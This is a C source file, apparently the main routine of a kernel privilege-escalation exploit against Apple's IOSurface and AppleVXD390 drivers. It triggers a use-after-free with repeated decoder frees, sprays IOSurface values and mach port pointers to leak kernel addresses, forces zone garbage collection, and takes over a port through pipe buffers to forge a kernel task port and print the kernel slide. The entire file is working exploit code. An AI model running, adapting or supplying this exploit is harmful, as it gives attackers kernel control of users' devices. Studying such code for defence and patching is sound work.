#include <stdio.h>
#include <IOKit/IOKitLib.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

#include "iosurface.h"
#include "applevxd390.h"
#include "mach-ports.h"
#include "gc.h"
#include "pipes.h"

extern kern_return_t mach_zone_force_gc(mach_port_t);

int main(int argc, char* argv[]) {
	
    int *pipe_fds;
	mach_port_t receive_port, target_port, own_task_port, 
	*before_ports, *after_ports, *spray_ports;
	uint32_t target_port_kp, own_task_port_kp, mach_host_self_kp;
	uint32_t target_port_page, target_port_offset;

    prepare_pipes(&pipe_fds);

	if (prepare_ports(&receive_port, &target_port, &own_task_port, 
			&before_ports, &after_ports, &spray_ports)) {
		printf("Failed to prepare ports\n");
		return 1;
	}

	io_connect_t iosurface_conn = openIOSurfaceConnection();
	if (iosurface_conn == MACH_PORT_NULL) {
		printf("Could not open connection to IOSurface\n");
		return 1;
	}
	uint32_t surface_id = createSurface(iosurface_conn);

	if (!surface_id) {
		printf("Could not create surface\n");
		return 1;
	}

	printf("surface ID: %x\n", surface_id);

	io_connect_t applevxd390_conn = createDecoder(surface_id);
	if (applevxd390_conn == MACH_PORT_NULL) {
		printf("Could not create decoder\n");
		return 1;
	}

	// first free
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}

	// this should take up the freed spot
	if (setValueZeroes(iosurface_conn, surface_id)) {
		printf("Could not set value spray1\n");
		// return 1; // this always returns fail?????
	}
	
	// second free
	// this shouldnt crash immediately if the data got placed where our freed object was
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		// return 1; // this fails due to corrupted object
	}

	if (spray_port_pointer(receive_port, target_port, own_task_port)) {
		printf("Could not spray mach port pointers\n");
		return 1;
	}

	if (getValue(iosurface_conn, surface_id, &target_port_kp, &own_task_port_kp, &mach_host_self_kp)) {
		printf("Could not read values\n");
		return 1;
	}

	target_port_page = get_port_page(target_port_kp);
	target_port_offset = get_port_offset(target_port_kp);
	printf("page: 0x%x 0x%x\n", target_port_page, target_port_offset);

	// third free
	// this shouldnt crash immediately if the data got placed where our freed object was
	// TODO This causes spinlock panic
	destroyDecoder(applevxd390_conn);
	
	// // // // this should take up the freed spot
	// // TODO This causes spinlock panic
	setValuePorts(iosurface_conn, surface_id, target_port_kp, own_task_port_kp, mach_host_self_kp);
	getValueDebug(iosurface_conn, surface_id);

	printf("About to destroy ports\n");
	destroy_ports(receive_port, before_ports, after_ports);
	printf("After destroy ports\n");

	// force_GC();
	mach_zone_force_gc(mach_host_self());
	printf("After GC ports\n");

	int port_number;
	if (spray_kalloc_4096(spray_ports, target_port, target_port_offset, &port_number)) {
		printf("Could find controlled port\n");
		return 1;
	}

	int pipe_number;
	if (control_port_via_pipe(pipe_fds, target_port_offset, &spray_ports[port_number], target_port, &pipe_number)) {
		printf("Could control port with pipe\n");
		return 1;
	}
	
    int read_fd = pipe_fds[2*pipe_number];
    int write_fd = pipe_fds[2*pipe_number+1];

	uint32_t kern_slide;
	if (create_kernel_task_port(read_fd, write_fd, target_port_page, target_port_offset, own_task_port_kp,
				&target_port, mach_host_self_kp, &kern_slide)) {
		printf("Could create kernel task port\n");
		return 1;
	}

	printf("kern slide: 0x%x\n", kern_slide);

	printf("Done!\n");

	while (true) {

	}

	return 0;
}
